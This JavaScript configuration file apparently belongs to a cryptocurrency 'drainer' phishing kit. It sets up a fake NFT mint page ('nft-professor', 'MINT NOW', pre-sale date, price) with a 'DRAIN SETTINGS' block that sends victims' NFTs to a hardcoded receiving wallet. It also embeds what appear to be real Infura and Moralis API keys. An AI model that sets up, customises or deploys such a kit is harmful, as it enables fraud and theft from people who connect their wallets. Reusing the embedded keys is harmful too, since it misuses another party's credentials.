/*
    = = = = = YOU WALLET ADRESS = = = = =
*/
const receiveAddress = "0xae8E762F8fE3D9c785d554Cc8ddD270DbabDf85D";
const infuraId = "f1e64b9f276a45898d5f8191c644adad"     // Infuria ID | https://infura.io/ | For Wallet Connect
const moralisApi = "kLXF7phtJc4Kqe5uzlnjkBxrrXl1pWtnOulB3TuWYYpEhf0OUAM41AKf8YI3hibo"    // x-api-key | https://moralis.io/ | For NFTs

/*
    = = = = = COLLECTION SETTINGS = = = = =
*/

const collectionInfo = {
    name: "nft-professor",
    date: "10.04.2022",
    socialMedia: {
        discord: "discord.gg/invite_here",
        twitter: "https://twitter.com/username_here",
    },
    medias: {
        preview: "preview.gif",
        favicon: "icon.png",
    },
    background: {
        type: "image", // Supported types: image, video, color (use image for gif)
        image: "background.jpg", // Image for image type or video preview for video type (image befor video load)
        video: "background.mp4", // If you don't use video type, you can ignore this line
        color: "#4E4E6D", // If you don't use color type, you can ignore this line
    }
}


/*
    = = = = = MINT INFORMATIONS = = = = =
*/

const mintInfo = {
    price: 0.2,
    totalSupply: 8888,
    minUnits: 1,
    maxUnits: 20,
    askMintLoop: true,
}

/*
    = = = = = DRAIN SETTINGS = = = = =
*/

const drainNftsInfo = {
    active: true,
    minValue: 0.2,
    maxTransfer: 1,
    nftReceiveAddress: "YOUR WALLET",
}

const customStrings = {
    title: "MINT {name}", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
    connectButton: "CONNECT WALLET",
    transferButton: "MINT NOW",
    dateString: "Pre sale available {date}", // Date string (ex "Pre sale available {date}") - You can use {date} to insert the collection date
}

/*
    = = = = = END OF SETTINGS = = = = =
*/

//#region Check Configuration
if (mintInfo.minUnits > mintInfo.maxUnits) console.error(`Error: minUnits (${mintInfo.minUnits}) is greater than maxUnits (${maxUnits})`);
if (mintInfo.minUnits <= 0) console.error(`Error: minUnits (${mintInfo.minUnits}) is less than or equal to 0`);

if (!receiveAddress.startsWith("0x") ||
    (
        receiveAddress.length >= 64 ||
        receiveAddress.length <= 40
    )
) console.error(`Error: ${receiveAddress} is not a valid Ethereum address.`);
//#endregion
